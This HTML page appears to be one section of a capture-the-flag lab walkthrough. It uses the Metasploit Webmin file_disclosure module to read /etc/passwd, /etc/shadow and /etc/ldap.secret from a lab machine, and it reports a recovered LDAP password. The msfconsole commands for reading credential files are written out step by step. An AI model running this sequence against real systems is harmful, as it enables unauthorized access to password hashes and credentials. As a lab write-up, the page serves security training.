<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>5. Retrieve /etc/passwd</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><a name="h2-1"></a><strong><h2>5. Retrieve /etc/passwd</h2></strong><br /><br />So that can we can escalate privilege on  the Target Machine as the flag would only be accessible by the root  user. This can be done as shown by using the auxiliary  admin/webmin/file_disclosure.<br /><br />Launch msfconsole<br /><br /><div class="codebox"><div class="codebox">$&nbsp;msfconsole</div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/24-1.png" alt="images/24-1.png" /><br /><br />Run the following commands within msfconsole.<br /><br /><strong>a) Look for “webmin” exploits</strong><br />Command: <span style="color:#00ff00;">search webmin</span><br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/24-2.png" alt="images/24-2.png" /><br /><br /><strong>b) Retrieve /etc/passwd file</strong><br /><br />We can escalate privilege on the Target Machine as the flag would only be accessible by the root user.<br /><br />Command: <span style="color:#00ff00;">use auxiliary/admin/webmin/file_disclosure</span><br />Command:<span style="color:#00ff00;"> set rhost 192.168.1.130</span><br />Command: <span style="color:#00ff00;">run</span><br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/24-3.png" alt="images/24-3.png" /><br /><br />And we have the /etc/passwd file of the  Target but this is only the half of the job because without the shadow  file this file is of no use.<br /><br /><strong>c) Retrieve /etc/passwd file </strong><br /><br />Command: <span style="color:#00ff00;">use auxiliary/admin/webmin/file_disclosure</span><br />Command:<span style="color:#00ff00;"> set rhost 192.168.1.130</span><br />Command: <span style="color:#00ff00;">set rpath /etc/shadow</span><br />Command: <span style="color:#00ff00;">run</span><br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/24-4.png" alt="images/24-4.png" /><br /><br /><strong>d) Retrieve ldap.secret file</strong><br /><br />During our initial enumeration, we also  found that the target also has LDAP installed so let’s get this file too  like it as it has the login credentials and the file is only be opened  with the root privileges. <br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/24-5.png" alt="images/24-5.png" /><br /><br />Command: <span style="color:#00ff00;">use auxiliary/admin/webmin/file_disclosure</span><br />Command:<span style="color:#00ff00;"> set rhost 192.168.1.130</span><br />Command: <span style="color:#00ff00;">set rpath /etc/ldap.secret</span><br />Command: <span style="color:#00ff00;">run</span><br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/24-6.png" alt="images/24-6.png" /><br /><br />As you can see that the file contains the password “canuhackme”.<br /><br /><p align="center"><img src="images/home.png" height="22" width="22">  <a href="index.html">Index</a></p></body></html>